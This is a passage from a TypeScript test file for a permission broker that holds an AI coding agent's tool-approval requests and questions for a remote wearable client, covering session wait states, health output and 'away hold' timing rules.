    const b = await broker.admit(permissionEnvelope('Bash', { command: 'echo secret-plan' }, {}, clock.now))
    if (!b.ok) throw new Error(b.reason)
    const bid = broker.park(b.request, fakeChannel(true).channel)
    expect(internals(bid).approval).not.toBeNull()
    broker.hookClosed(bid)
    expect(internals(bid)).toMatchObject({ questions: null, approval: null, toolInput: {} })
    expect(JSON.stringify(internals(bid))).not.toContain('secret-plan')
  })

  it('counts every refused answer', async () => {
    const { broker, clock } = brokerWith()
    brokers.push(broker)
    const a = await broker.admit(permissionEnvelope('AskUserQuestion', ASK_INPUT, {}, clock.now))
    if (!a.ok) throw new Error(a.reason)
    const id = broker.park(a.request, fakeChannel(true).channel)
    expect(broker.answer(id, { answers: [] }).status).toBe(400)
    expect(broker.answer(id, { clientAnswerId: 'c', answers: [{ labels: ['Nope'] }, { labels: ['Blue'] }] }).status).toBe(400)
    const b = await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, {}, clock.now))
    if (!b.ok) throw new Error(b.reason)
    const bid = broker.park(b.request, fakeChannel(true).channel)
    expect(broker.answer(bid, { clientAnswerId: 'c', decision: 'maybe' }).status).toBe(400)
    expect(broker.health().counters.invalidAnswer).toBe(3)
  })
})

describe('the rows (session signal store seams)', () => {
  const T0 = 1_000_000
  const derived = (store: SessionSignalStore, now: number, registry?: Parameters<typeof deriveSessionState>[0]['registry']) =>
    derivedRowFields(deriveSessionState({ signal: store.get(SESSION), registry, transcript: undefined, now }))

  it('an AskUserQuestion stays a QUESTION through its PermissionRequest and clears when the answered tool runs', () => {
    const store = new SessionSignalStore({ isCosSpawnedPid: () => false })
    store.apply(hookEvent('UserPromptSubmit', T0, { prompt: 'ship it' }))
    store.apply(hookEvent('PreToolUse', T0 + 10, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    store.apply(hookEvent('PermissionRequest', T0 + 20, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    expect(derived(store, T0 + 30)).toMatchObject({ agent_state: 'waiting', waiting_kind: 'question' })
    // The input the tool ran with carries `answers`, so its fingerprint differs: the tool name clears it.
    store.apply(hookEvent('PostToolUse', T0 + 40, { tool_name: 'AskUserQuestion', tool_input: { ...ASK_INPUT, answers: { [Q1]: ['Bump'], [Q2]: ['Blue'] } } }))
    expect(derived(store, T0 + 50)).toMatchObject({ agent_state: 'running' })
    expect(derived(store, T0 + 50)).not.toHaveProperty('waiting_kind')
    // Any other tool's request is still a permission.
    store.apply(hookEvent('PermissionRequest', T0 + 60, { tool_name: 'Bash', tool_input: { command: 'ls' } }))
    expect(derived(store, T0 + 70)).toMatchObject({ waiting_kind: 'permission' })
  })

  it('a parked question carries pending_question_id, an approval pending_permission_id; the answer clears the wait', async () => {
    const store = new SessionSignalStore({ isCosSpawnedPid: () => false })
    const { broker, clock } = brokerWith({ signals: brokerSignalSink(store) }, { now: T0 + 100 })
    brokers.push(broker)
    wirePermissionBrokerToSignals(broker, store)
    store.apply(hookEvent('UserPromptSubmit', T0, { prompt: 'ship it' }))
    store.apply(hookEvent('PreToolUse', T0 + 10, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    store.apply(hookEvent('PermissionRequest', T0 + 20, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    const a = await broker.admit(permissionEnvelope('AskUserQuestion', ASK_INPUT, {}, T0 + 20))
    if (!a.ok) throw new Error(a.reason)
    const { channel } = fakeChannel(true)
    const id = broker.park(a.request, channel)
    const row = derived(store, clock.now)
    expect(row).toMatchObject({ agent_state: 'waiting', waiting_kind: 'question', pending_question_id: id })
    expect(row).not.toHaveProperty('pending_permission_id')
    // The async PreToolUse landing late re-announces the same request: the id stays.
    store.apply(hookEvent('PreToolUse', T0 + 25, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    expect(derived(store, clock.now)).toMatchObject({ pending_question_id: id })
    // A registry that moved after the wait (Claude writes its record while the hook is
    // held) does not end a wait the broker positively holds.
    const moved = { alive: true, status: 'busy', waitingFor: null, statusUpdatedAt: T0 + 50, lastActiveAt: T0 + 50 }
    expect(derived(store, clock.now, moved)).toMatchObject({ agent_state: 'waiting', pending_question_id: id })
    expect(broker.answer(id, { clientAnswerId: 'c1', answers: [{ labels: ['Bump'] }, { labels: ['Blue'] }] }).status).toBe(200)
    expect(derived(store, clock.now)).toMatchObject({ agent_state: 'running' })
    // A late copy of the PermissionRequest (stamped before the answer) must not strand the row.
    store.apply(hookEvent('PermissionRequest', T0 + 20, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    expect(derived(store, clock.now)).toMatchObject({ agent_state: 'running' })
    // The SAME question asked again later is a new wait.
    clock.now += 1_000
    store.apply(hookEvent('PreToolUse', clock.now, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    expect(derived(store, clock.now)).toMatchObject({ agent_state: 'waiting', waiting_kind: 'question' })
    expect(derived(store, clock.now)).not.toHaveProperty('pending_question_id')

    store.apply(hookEvent('Stop', clock.now + 1))
    store.apply(hookEvent('UserPromptSubmit', clock.now + 2, { prompt: 'next' }))
    store.apply(hookEvent('PermissionRequest', clock.now + 3, { tool_name: 'Bash', tool_input: { command: 'touch x' } }))
    const b = await broker.admit(permissionEnvelope('Bash', { command: 'touch x' }, {}, clock.now + 3))
    if (!b.ok) throw new Error(b.reason)
    const approvalId = broker.park(b.request, fakeChannel(true).channel)
    expect(derived(store, clock.now + 4)).toMatchObject({ waiting_kind: 'permission', pending_permission_id: approvalId })
    expect(derived(store, clock.now + 4)).not.toHaveProperty('pending_question_id')
    // Handed back to the desk: the wait stands (the native dialog is up), without the id.
    broker.observeHookEvent(hookEvent('UserPromptSubmit', clock.now + 5, { prompt: 'x' }), false)
    expect(derived(store, clock.now + 6)).not.toHaveProperty('pending_permission_id')
  })

  it('the reducer itself keeps the id across a re-announcement of the same request, and only that one', () => {
    // No broker listener here: the store alone must not drop the id the rows carry.
    const store = new SessionSignalStore({ isCosSpawnedPid: () => false })
    store.apply(hookEvent('UserPromptSubmit', T0, { prompt: 'ship it' }))
    store.apply(hookEvent('PermissionRequest', T0 + 10, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    expect(store.attachPermissionRequestId(SESSION, 'pq_000000000000000000000001', toolFingerprint('AskUserQuestion', ASK_INPUT))).toBe(true)
    store.apply(hookEvent('PreToolUse', T0 + 20, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    expect(derived(store, T0 + 30)).toMatchObject({ waiting_kind: 'question', pending_question_id: 'pq_000000000000000000000001' })
    store.apply(hookEvent('PermissionRequest', T0 + 40, { tool_name: 'AskUserQuestion', tool_input: ASK_INPUT }))
    expect(derived(store, T0 + 50)).toMatchObject({ pending_question_id: 'pq_000000000000000000000001' })
    // A different request is a different wait: no borrowed id.
    store.apply(hookEvent('PermissionRequest', T0 + 60, { tool_name: 'Bash', tool_input: { command: 'ls' } }))
    expect(derived(store, T0 + 70)).toMatchObject({ waiting_kind: 'permission' })
    expect(derived(store, T0 + 70)).not.toHaveProperty('pending_permission_id')
  })

  it('parked before the spool delivered its PermissionRequest: the event attaches the id when it lands', async () => {
    const store = new SessionSignalStore({ isCosSpawnedPid: () => false })
    const { broker, clock } = brokerWith({ signals: brokerSignalSink(store) }, { now: T0 + 100 })
    brokers.push(broker)
    wirePermissionBrokerToSignals(broker, store)
    store.apply(hookEvent('UserPromptSubmit', T0, { prompt: 'ship it' }))
    const a = await broker.admit(permissionEnvelope('Bash', { command: 'touch x' }, {}, T0 + 20))
    if (!a.ok) throw new Error(a.reason)
    const id = broker.park(a.request, fakeChannel(true).channel)
    expect(derived(store, clock.now)).not.toHaveProperty('pending_permission_id')
    store.apply(hookEvent('PermissionRequest', T0 + 20, { tool_name: 'Bash', tool_input: { command: 'touch x' } }))
    expect(derived(store, clock.now)).toMatchObject({ agent_state: 'waiting', pending_permission_id: id })
    // A different dialog standing never takes another request's id, and a decision about
    // another request never clears it.
    expect(store.attachPermissionRequestId(SESSION, 'pq_other', toolFingerprint('Bash', { command: 'ls' }))).toBe(false)
    store.resolveWaiting(SESSION, { requestId: 'pq_other', fingerprint: toolFingerprint('Bash', { command: 'ls' }) })
    expect(derived(store, clock.now)).toMatchObject({ agent_state: 'waiting', pending_permission_id: id })
    store.detachPermissionRequestId(SESSION, 'pq_other')
    expect(derived(store, clock.now)).toMatchObject({ pending_permission_id: id })
    store.detachPermissionRequestId(SESSION, id)
    expect(derived(store, clock.now)).toMatchObject({ agent_state: 'waiting' })
    expect(derived(store, clock.now)).not.toHaveProperty('pending_permission_id')
    store.resolveWaiting(SESSION, { requestId: id, fingerprint: toolFingerprint('Bash', { command: 'touch x' }) })
    expect(derived(store, clock.now)).toMatchObject({ agent_state: 'running' })
  })

  it('health carries counts and the mode, never an id or text', async () => {
    const { broker, clock } = brokerWith()
    brokers.push(broker)
    registerPermissionBroker(broker)
    const a = await broker.admit(permissionEnvelope('AskUserQuestion', ASK_INPUT, {}, clock.now))
    if (!a.ok) throw new Error(a.reason)
    const id = broker.park(a.request, fakeChannel(true).channel)
    const { permissionBroker } = permissionBrokerHealthFields()
    expect(permissionBroker).toEqual({
      enabled: true, mode: 'all', lastFastPath: null, lastFastPathAt: null,
      lastQuestionsPollAt: new Date(clock.now).toISOString(),
    })
    // No counters on the PUBLIC health (QA round 2): pending = parked - resolutions.
    expect(permissionBroker).not.toHaveProperty('counters')
    expect(broker.stats().counters).toEqual({ parked: 1, answered: 0, handedToDesk: 0, handedBack: 0, expired: 0, hookGone: 0, retracted: 0, drained: 0, noClient: 0, invalidAnswer: 0, deskUnreadable: 0, awayHeld: 0, parkedWithoutClient: 0 })
    // How many are held is on the authenticated questions route, never the public health.
    expect(permissionBroker).not.toHaveProperty('pending')
    const text = JSON.stringify(permissionBroker)
    expect(text).not.toContain(id)
    expect(text).not.toContain('release')
    // One key style across the block, the reason codes included.
    const keys = (value: unknown): string[] => value && typeof value === 'object' ? Object.entries(value).flatMap(([k, v]) => [k, ...keys(v)]) : []
    await broker.admit(permissionEnvelope('Bash', { command: 'ls' }, { cursor_version: '1' }, clock.now))
    for (const key of keys(broker.health())) expect(key, key).toMatch(/^[a-z][A-Za-z]*$/)
    expect(broker.health()).toMatchObject({ lastFastPath: 'cursor', lastFastPathAt: new Date(clock.now).toISOString() })
    expect(sessionQuestionsCapability()).toEqual({ enabled: true, mode: 'all', protocolVersion: 1, pollIntervalMs: 10_000, liveWindowMs: 30_000, awayHoldMs: 0, awayRecentClientMs: 0 })
    registerPermissionBroker(null)
    expect(permissionBrokerHealthFields()).toEqual({ permissionBroker: null })
    expect(sessionQuestionsCapability()).toEqual({ enabled: false, mode: 'off', protocolVersion: 1, pollIntervalMs: 10_000, liveWindowMs: 30_000, awayHoldMs: 0, awayRecentClientMs: 0 })
  })
})

describe('6.60.0: the away hold', () => {
  /** A request the 6.60.0 script posts: the hook's own wait stamped on it. */
  const stamped = (tool: string, input: Record<string, unknown>, ts: number, hookWaitS: number | null = PERMISSION_HOOK_TIMEOUT_S) =>
    hookWaitS === null ? permissionEnvelope(tool, input, {}, ts) : { ...permissionEnvelope(tool, input, {}, ts), hookWaitS }
  const DEFAULT_HOLD_MS = permissionBrokerAwayHoldMs({})
  const DEFAULT_WINDOW_MS = permissionBrokerAwayRecentClientMs({})
  /**
   * The production settings (the defaults, the 6.60.0 hook installed) with the presence the
   * test sets: `p.presenceAt` (wall ms of the newest qualifying presence, null for none) and
   * `p.holdPollAt` (the newest hold=1 poll). By default a lens was worn 10 minutes ago and
   * is not polling now.
   */
  function away(over: Partial<PermissionBrokerDeps> = {}, state: Parameters<typeof brokerWith>[1] = {}) {
    const lines: string[] = []
    const p: { presenceAt: number | null; holdPollAt: number | null; windowMs: number } = { presenceAt: null, holdPollAt: null, windowMs: DEFAULT_WINDOW_MS }
    const made = brokerWith({
      awayHoldMs: () => DEFAULT_HOLD_MS,
      installedHookTimeoutS: () => PERMISSION_HOOK_TIMEOUT_S,
      presenceAgeMs: () => (p.presenceAt === null ? null : made.clock.now - p.presenceAt),
      lastHoldPollAt: () => p.holdPollAt,
      awayRecentClientMs: () => p.windowMs,
      log: line => { lines.push(line) },
      ...over,
    }, state)
    p.presenceAt = made.clock.now - 600_000
    brokers.push(made.broker)
    return { ...made, lines, p }
  }
  async function parkOne(b: PermissionBroker, envelope: unknown) {
    const a = await b.admit(envelope)
    if (!a.ok) throw new Error(a.reason)
    const c = fakeChannel(true)
    return { id: b.park(a.request, c.channel), sent: c.sent, request: a.request }
  }
  const fastPathLine = (lines: string[]) => lines.filter(line => line.startsWith('[permission-broker] fast path')).at(-1) ?? ''

  it('COS_PERMISSION_BROKER_AWAY_HOLD_S: default 600, clamped to [30, 600]; 0, off or false is off; junk is the default', () => {
    expect(AWAY_HOLD_DEFAULT_S).toBe(600)
    expect(DEFAULT_HOLD_MS).toBe(600_000)
    for (const off of ['0', 'off', 'false', ' OFF ']) expect(permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: off }), off).toBe(0)
    for (const junk of ['', 'abc', '-5', 'NaN', 'Infinity']) expect(permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: junk }), junk).toBe(600_000)
    expect(permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: '300' })).toBe(300_000)
    expect(permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: '5' })).toBe(30_000)
    expect(permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: '601' })).toBe(600_000)
    expect(permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: '1e9' })).toBe(600_000)
  })

  it('both away-hold settings are in the managed runtime contract (QA round 1, Completionist N8)', () => {
    const contract = JSON.parse(readFileSync(new URL('../../managed-runtime-contract.json', import.meta.url), 'utf8')) as { optionalEnvironment: string[] }
    for (const key of ['COS_PERMISSION_BROKER', 'COS_PERMISSION_BROKER_DESK_IDLE_S', 'COS_PERMISSION_BROKER_TIMEOUT_S', 'COS_PERMISSION_BROKER_AWAY_HOLD_S', 'COS_PERMISSION_BROKER_AWAY_RECENT_CLIENT_S']) {
      expect(contract.optionalEnvironment, key).toContain(key)
    }
  })

  it('COS_PERMISSION_BROKER_AWAY_RECENT_CLIENT_S: default 1800, clamped to [0, 86400], junk is the default; below 30 s the window is the 30 s live window', async () => {
    expect(AWAY_RECENT_CLIENT_DEFAULT_S).toBe(1_800)
    expect(DEFAULT_WINDOW_MS).toBe(1_800_000)
    expect(permissionBrokerAwayRecentClientMs({ COS_PERMISSION_BROKER_AWAY_RECENT_CLIENT_S: '0' })).toBe(0)
    expect(permissionBrokerAwayRecentClientMs({ COS_PERMISSION_BROKER_AWAY_RECENT_CLIENT_S: '600' })).toBe(600_000)
    expect(permissionBrokerAwayRecentClientMs({ COS_PERMISSION_BROKER_AWAY_RECENT_CLIENT_S: '1e9' })).toBe(86_400_000)
    for (const junk of ['', 'abc', '-5', 'NaN', 'Infinity', ' ']) expect(permissionBrokerAwayRecentClientMs({ COS_PERMISSION_BROKER_AWAY_RECENT_CLIENT_S: junk }), junk).toBe(1_800_000)
    // `0`: the wearer's presence must be within the 30 s live window.
    const { broker, clock, p } = away({}, { seenAt: null })
    p.windowMs = 0
    p.presenceAt = clock.now - CLIENT_LIVE_WINDOW_MS - 1
    expect(await broker.admit(stamped('Bash', { command: 'touch a' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    p.presenceAt = clock.now - CLIENT_LIVE_WINDOW_MS
    expect((await parkOne(broker, stamped('Bash', { command: 'touch b' }, clock.now))).request.awayHold).toBe(true)
    expect(broker.awayRecentClientWindowMs()).toBe(CLIENT_LIVE_WINDOW_MS)
  })

  it('holdCeilingS: the installed timeout and this request\'s stamp, the lesser minus 10; unreadable settings use the stamp; an unstamped request is never past 120', () => {
    expect(holdCeilingS(630, 630)).toBe(620)
    // The earlier hook: 130 s in the settings, no stamp: 120, never past its 125 s curl.
    expect(holdCeilingS(130, null)).toBe(120)
    // Settings already 630 but this request came from the earlier script or block (no stamp).
    expect(holdCeilingS(630, null)).toBe(120)
    // A stamp from a newer block while the file says 130 (reinstalled, then rolled back).
    expect(holdCeilingS(130, 630)).toBe(120)
    // Unreadable settings (QA round 1, N4): this invocation's own stamp still bounds it.
    expect(holdCeilingS(null, 630)).toBe(620)
    expect(holdCeilingS(null, 20)).toBe(10)
    expect(holdCeilingS(Number.NaN, 630)).toBe(620)
    // ...and with no stamp, the old safe clamp.
    expect(holdCeilingS(null, null)).toBe(BROKER_TIMEOUT_MAX_S)
    for (const installed of [null, 130, 630, 5_000]) expect(holdCeilingS(installed, null), String(installed)).toBeLessThanOrEqual(120)
    // A short hand-set hook bounds it too, and a ceiling at or below zero is never negative.
    expect(holdCeilingS(60, null)).toBe(50)
    expect(holdCeilingS(5, null)).toBe(0)
    expect(LEGACY_HOOK_WAIT_S).toBe(130)
  })

  it('the away extension: a lens worn 10 minutes ago, none polling now: held to the away hold, deadlineAt says so, and the numbers are logged', async () => {
    const { broker, clock, lines } = away({}, { seenAt: null })
    const hookStart = clock.now - 2_000
    const { id, request } = await parkOne(broker, stamped('Bash', { command: 'ls' }, hookStart))
    expect(request.deadlineAt).toBe(hookStart + 600_000)
    const [item] = broker.list()
    expect(item).toMatchObject({ id, answerable: true, awayHold: true, waitingAtMac: false, deadlineAt: new Date(hookStart + 600_000).toISOString() })
    const parked = lines.find(line => line.includes(`parked ${id}`))!
    const hold = JSON.parse(parked.slice(parked.lastIndexOf(' hold=') + 6))
    expect(hold).toEqual({ installedHookTimeoutS: 630, hookWaitS: 630, awayHoldS: 600, ceilingS: 620, effectiveDeadlineS: 600, deskIdleMs: 1_000_000, clientLive: false, presenceAgeMs: 600_000, recentWindowS: 1_800, notAwayReason: null })
    expect(parked).not.toContain('"command"')
    expect(broker.stats().counters).toMatchObject({ parked: 1, awayHeld: 1, parkedWithoutClient: 1 })
    // Still answerable well past the old 110 s, the wearer's presence still within the window.
    clock.now += 300_000
    await broker.tick()
    expect(broker.answer(id, { clientAnswerId: 'lens', decision: 'allow' }).status).toBe(200)
  })

  it('never shorter than the base timeout: a 30 s away hold still holds the 110 s base (QA round 1, Ghost Hunter S2)', async () => {
    const { broker, clock } = away({ awayHoldMs: () => permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: '30' }) }, { seenAt: null })
    const { request } = await parkOne(broker, stamped('Bash', { command: 'ls' }, clock.now))
    expect(request.awayHold).toBe(true)
    expect(request.deadlineAt - clock.now).toBe(110_000)
  })

  it('a hold=1 lens polling every 10 s with no presence (nobody wearing it): no hold, {} at once (QA round 1, Skeptic W1)', async () => {
    const { broker, clock, p, s, lines } = away({}, { seenAt: null })
    p.presenceAt = null
    for (let i = 0; i < 3; i++) {
      p.holdPollAt = clock.now
      expect(await broker.admit(stamped('Bash', { command: 'touch unworn' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
      clock.now += 10_000
    }
    expect(s.idleReads).toBe(0)
    expect(broker.stats().counters.parked).toBe(0)
    expect(fastPathLine(lines)).toBe('[permission-broker] fast path no_client not_away=no_hold_client presenceAgeMs=null windowMs=1800000 clientLive=false')
  })

  it('an older client (no hold=1) is the 6.59.0 broker: held 110 s while it polls, handed back when it goes quiet, never away (QA round 1, W3/W6)', async () => {
    const { broker, clock, s, p } = away({ lastLegacyPollAt: () => s.seenAt }, { seenAt: null })
    p.presenceAt = null
    expect(await broker.admit(stamped('Bash', { command: 'touch none' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    s.seenAt = clock.now
    const held = await parkOne(broker, stamped('Bash', { command: 'touch old' }, clock.now))
    expect(held.request.awayHold).toBe(false)
    expect(held.request.deadlineAt - clock.now).toBe(110_000)
    expect(held.request.hold).toMatchObject({ clientLive: true, notAwayReason: 'no_hold_client' })
    s.seenAt = null
    await broker.tick()
    expect(held.sent).toEqual([{}])
    expect(broker.health().counters.noClient).toBe(1)
  })

  it('a lens worn 10 minutes ago gives a hold; 30 minutes is held, 30 minutes and 1 ms or 31 minutes is not', async () => {
    const { broker, clock, p, lines } = away({}, { seenAt: null })
    p.presenceAt = clock.now - 10 * 60_000
    expect((await parkOne(broker, stamped('Bash', { command: 'touch ten' }, clock.now))).request.awayHold).toBe(true)
    p.presenceAt = clock.now - 30 * 60_000
    const edge = await parkOne(broker, stamped('Bash', { command: 'touch edge' }, clock.now))
    expect(edge.request.awayHold).toBe(true)
    for (const ageMs of [30 * 60_000 + 1, 31 * 60_000]) {
      p.presenceAt = clock.now - ageMs
      expect(await broker.admit(stamped('Bash', { command: 'touch old' }, clock.now)), String(ageMs)).toEqual({ ok: false, reason: 'no_client' })
    }
    expect(fastPathLine(lines)).toBe(`[permission-broker] fast path no_client not_away=stale_presence presenceAgeMs=${31 * 60_000} windowMs=1800000 clientLive=false`)
  })

  it('recency is re-checked every tick: presence at 29:59 and nothing since hands back at about 30:00, not at 600 s (QA round 1, Skeptic W2)', async () => {
    const { broker, clock, p } = away({}, { seenAt: null })
    p.presenceAt = clock.now - (29 * 60_000 + 59_000)
    const { id, sent } = await parkOne(broker, stamped('AskUserQuestion', ASK_INPUT, clock.now))
    clock.now += 1_000 // 30:00 exactly: still within
    await broker.tick()
    expect(sent).toEqual([])
    clock.now += 1 // 30:00 and 1 ms: no client live, presence stale
    await broker.tick()
    expect(sent).toEqual([{}])
    expect(broker.settledList()).toMatchObject([{ id, resolution: 'no_client', awayHold: true, waitingAtMac: true }])
    // A wearer who came back in time keeps it: fresh presence, then the old one would have lapsed.
    const again = away({}, { seenAt: null })
    again.p.presenceAt = again.clock.now - (29 * 60_000 + 59_000)
    const kept = await parkOne(again.broker, stamped('Bash', { command: 'touch kept' }, again.clock.now))
    again.p.presenceAt = again.clock.now + 500
    again.clock.now += 60_000
    await again.broker.tick()
    expect(kept.sent).toEqual([])
  })

  it('a hold=1 client polling with recent presence counts as live; once its presence lapses it does not', async () => {
    const { broker, clock, p } = away({ awayHoldMs: () => 0 }, { seenAt: null })
    // Away hold off: the 6.59.0 broker, where a worn lens that polls is a live client.
    p.presenceAt = clock.now - 5_000
    p.holdPollAt = clock.now
    const held = await parkOne(broker, stamped('Bash', { command: 'touch worn' }, clock.now))
    expect(held.request.awayHold).toBe(false)
    expect(held.request.hold).toMatchObject({ clientLive: true, notAwayReason: 'hold_off' })
    // Still polling and still worn a minute later: live, kept.
    clock.now += 60_000
    p.holdPollAt = clock.now
    p.presenceAt = clock.now
    await broker.tick()
    expect(held.sent).toEqual([])
    // Still polling, but nobody has worn it for 31 minutes: not live, handed back.
    clock.now += 31 * 60_000
    p.holdPollAt = clock.now
    await broker.tick()
    expect(held.sent).toEqual([{}])
  })

  it('before Install hooks (the ceiling at or below the 6.59.0 clamp) away semantics are off entirely: 6.59.0 (QA round 1, User W6)', async () => {
    expect(AWAY_MIN_CEILING_S).toBe(BROKER_TIMEOUT_MAX_S)
    const { broker, clock, s, lines } = away({ installedHookTimeoutS: () => LEGACY_PERMISSION_HOOK_TIMEOUT_S }, { seenAt: null })
    // A lens worn 10 minutes ago, quiet now: 6.59.0 would answer {} at once, so this does.
    expect(await broker.admit(stamped('Bash', { command: 'touch a' }, clock.now, null))).toEqual({ ok: false, reason: 'no_client' })
    expect(fastPathLine(lines)).toContain('not_away=ceiling_at_base')
    // A 6.60.0 request against the 130 s settings: the same.
    expect(await broker.admit(stamped('Bash', { command: 'touch b' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    // A live client: held the base 110 s, not away, and handed back when it goes quiet.
    s.seenAt = clock.now
    const held = await parkOne(broker, stamped('Bash', { command: 'touch c' }, clock.now, null))
    expect(held.request.awayHold).toBe(false)
    expect(held.request.deadlineAt - clock.now).toBe(110_000)
    expect(held.request.hold).toMatchObject({ ceilingS: 120, notAwayReason: 'ceiling_at_base' })
    s.seenAt = null
    await broker.tick()
    expect(held.sent).toEqual([{}])
    expect(broker.awayHoldNowMs()).toBe(0)
  })

  it('the installed-timeout clamp: the base hold of an earlier hook ends before its 125 s curl; a short hook bounds it too', async () => {
    const legacy = away({ installedHookTimeoutS: () => LEGACY_PERMISSION_HOOK_TIMEOUT_S, timeoutMs: () => permissionBrokerTimeoutMs({ COS_PERMISSION_BROKER_TIMEOUT_S: '120' }) })
    legacy.s.seenAt = legacy.clock.now
    const old = await parkOne(legacy.broker, stamped('Bash', { command: 'ls' }, legacy.clock.now, null))
    expect(old.request.deadlineAt - legacy.clock.now).toBe(120_000)
    expect(old.request.deadlineAt - legacy.clock.now).toBeLessThan(HOOK_CURL_MAX_S * 1000)
    legacy.clock.now += 120_000
    expect(legacy.broker.answer(old.id, { clientAnswerId: 'late', decision: 'allow' })).toEqual({ status: 409, body: { error: 'expired' } })
    expect(old.sent).toEqual([{}])
    const short = away({ installedHookTimeoutS: () => 60 })
    short.s.seenAt = short.clock.now
    const brief = await parkOne(short.broker, stamped('Bash', { command: 'ls' }, short.clock.now, null))
    expect(brief.request.deadlineAt - short.clock.now).toBe(50_000)
  })

  it('unreadable settings: a stamped request is bounded by its own stamp, an unstamped one by 120 s; a throw or NaN reads as unreadable', async () => {
    for (const installed of [() => { throw new Error('EACCES') }, () => Number.NaN, () => null, () => -1]) {
      const { broker, clock } = away({ installedHookTimeoutS: installed as () => number | null }, { seenAt: null })
      const { request } = await parkOne(broker, stamped('Bash', { command: 'ls' }, clock.now))
      expect(request.deadlineAt - clock.now).toBe(600_000)
      expect(request.hold).toMatchObject({ installedHookTimeoutS: null, ceilingS: 620 })
      expect(await broker.admit(stamped('Bash', { command: 'ls' }, clock.now, null))).toEqual({ ok: false, reason: 'no_client' })
    }
  })

  it('no client ever (a Remote Control session with no glasses): {} at arrival, before the desk is read, logged', async () => {
    const { broker, clock, s, p, lines } = away({}, { seenAt: null })
    p.presenceAt = null
    expect(await broker.admit(stamped('Bash', { command: 'touch remote' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    expect(await broker.admit(stamped('AskUserQuestion', ASK_INPUT, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    expect(s.idleReads).toBe(0)
    expect(broker.stats().counters).toMatchObject({ parked: 0, awayHeld: 0, parkedWithoutClient: 0 })
    expect(fastPathLine(lines)).toBe('[permission-broker] fast path no_client not_away=no_hold_client presenceAgeMs=null windowMs=1800000 clientLive=false')
  })

  it('every fast path logs its reason, the presence age and the window (QA round 1, Completionist N9)', async () => {
    const { broker, clock, s, lines } = away({}, { seenAt: null, mode: 'off' })
    await broker.admit(stamped('Bash', { command: 'echo hidden-text' }, clock.now))
    expect(fastPathLine(lines)).toBe('[permission-broker] fast path broker_off presenceAgeMs=600000 windowMs=1800000')
    s.mode = 'all'
    s.idle = 3
    await broker.admit(stamped('Bash', { command: 'echo hidden-text' }, clock.now))
    expect(fastPathLine(lines)).toBe('[permission-broker] fast path desk_active not_away=desk_active presenceAgeMs=600000 windowMs=1800000 clientLive=false')
    const off = away({ awayHoldMs: () => permissionBrokerAwayHoldMs({ COS_PERMISSION_BROKER_AWAY_HOLD_S: '0' }) }, { seenAt: null })
    await off.broker.admit(stamped('Bash', { command: 'echo hidden-text' }, off.clock.now))
    expect(fastPathLine(off.lines)).toBe('[permission-broker] fast path no_client not_away=hold_off presenceAgeMs=600000 windowMs=1800000 clientLive=false')
    // Numbers and codes only.
    for (const line of [...lines, ...off.lines]) expect(line).not.toContain('hidden-text')
  })

  it('a server restart: nothing counts until a hold=1 poll with presence (the real liveness module); then held', async () => {
    __resetClientLivenessForTests()
    try {
      const { broker, clock } = away({ lastQuestionsPollAt, lastLegacyPollAt: lastLegacyQuestionsPollAt, lastHoldPollAt: lastHoldQuestionsPollAt, presenceAgeMs: () => presenceAgeMs(monotonicNowMs(), clock.now) })
      expect(await broker.admit(stamped('Bash', { command: 'touch boot' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
      // The 6.9.563 lens polls with a wearer touch 10 minutes ago, then goes quiet.
      noteQuestionsPoll(clock.now - 60_000, { hold: true, presenceAgeMs: 540_000 })
      const held = await parkOne(broker, stamped('Bash', { command: 'touch later' }, clock.now))
      expect(held.request.awayHold).toBe(true)
      expect(held.request.hold?.clientLive).toBe(false)
      expect(held.request.hold?.presenceAgeMs).toBeGreaterThanOrEqual(600_000)
      expect(held.request.hold?.presenceAgeMs).toBeLessThan(605_000)
      __resetClientLivenessForTests()
      expect(await broker.admit(stamped('Bash', { command: 'touch again' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
    } finally {
      __resetClientLivenessForTests()
    }
  })

  it('the real defaults, wired as index.ts wires them: a worn lens holds 600 s, nothing else holds', async () => {
    __resetClientLivenessForTests()
    try {
      const env: NodeJS.ProcessEnv = {}
      const clock = { now: Date.now() }
      const broker = new PermissionBroker({
        now: () => clock.now, mode: () => permissionBrokerMode(env, true), admissionsOpen: () => true,
        lastQuestionsPollAt, lastLegacyPollAt: lastLegacyQuestionsPollAt, lastHoldPollAt: lastHoldQuestionsPollAt,
        presenceAgeMs: () => presenceAgeMs(),
        readDeskIdleSeconds: async () => 1_000, deskIdleSeconds: () => 90,
        timeoutMs: () => permissionBrokerTimeoutMs(env), awayHoldMs: () => permissionBrokerAwayHoldMs(env),
        installedHookTimeoutS: () => PERMISSION_HOOK_TIMEOUT_S, awayRecentClientMs: () => permissionBrokerAwayRecentClientMs(env),
        pollMs: 60_000, log: () => {},
      })
      brokers.push(broker)
      expect(await broker.admit(stamped('Bash', { command: 'touch x' }, clock.now))).toEqual({ ok: false, reason: 'no_client' })
      noteQuestionsPoll(clock.now, { hold: true, presenceAgeMs: 0 })
